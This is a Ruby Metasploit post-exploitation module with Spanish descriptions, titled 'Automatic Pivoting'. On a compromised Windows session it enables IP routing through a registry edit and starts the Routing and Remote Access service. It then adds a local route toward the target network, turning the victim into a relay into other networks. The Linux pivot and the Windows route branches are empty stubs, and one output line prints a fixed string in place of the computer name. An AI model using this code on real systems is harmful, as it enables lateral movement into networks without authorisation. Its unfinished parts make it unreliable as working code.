##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows'

class MetasploitModule < Msf::Post

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Automatic Pivoting',
        'Description'   => %q{Configura el equipo como pivot entre dos o mas redes. Funciona para equipos Windows y Linux. Es necesario tener privilegios de administrador.},
        'License'       => MSF_LICENSE,
        'Author'        => 
           [
             'none',
             'none <none[at]gmail.com>'
           ],
		'Platform'      => [ 'win', 'linux'],
        'SessionTypes'  => [ 'meterpreter','shell']
      ))

    register_options(
      [
		# OptBool.new( 'SYSTEMINFO', [ true, 'True if you want to get system info', 'TRUE' ])
		OptString.new('NET',    [true, 'Red que pretendemos alcanzar (Ej: 10.0.0.0/24)']),
		OptString.new('RHOST',    [true, 'IP de la maquina PIVOT (nuestra red)']),
		OptString.new('LOS',    [true, 'Sistema Operativo local (linux o windows)'])
      ])
  end
	#
  	# linux
  	#
	def linux_pivot()

	end
	#
  	# windows
  	#
	def windows_pivot()
		print_line("Enabling IP Router...")
		print_good(cmd_exec("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\" /f /v IPEnableRouter /t REG_DWORD /d 1"))
		print_line("Enabling Routing and Remote Access service...")
		print_good(cmd_exec("sc config RemoteAccess start= auto"))
		print_line("Starting Routing and Remote Access service...")
		print_good(cmd_exec("net start RemoteAccess"))
	end
	#
  	# acciones segun eleccion plataforma
  	#
	def set_pivot()
		case session.platform
	  	when 'linux'
			#
		  	# codigo para linux
		  	#
		  	linux_pivot()
		when 'windows'
			#
		  	# codigo para windows
		  	#
			windows_pivot()
		end
	end
	
	def create_route()
	#
	# Crea la ruta en la máquina local
	#
		case datastore['LOS']
	  	when 'linux'
			#
		  	# codigo para linux
		  	#
		  	print_line("Routing the new network...")
		  	if system("route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
				print_good("Route added.")
			else
				print_bad("Route failed.")
			end
		when 'windows'
			#
		  	# codigo para windows
		  	#
		end
	end
	
	#
  	# funcion principal, donde se invocan las otras segun plataforma
  	#
	def run

		print_good("OS: #{session.sys.config.sysinfo['OS']}")
		print_good("Computer name: #{'Computer'} ")
		print_good("Current user: #{session.sys.config.getuid}")
		set_pivot()
		create_route()
  end
end
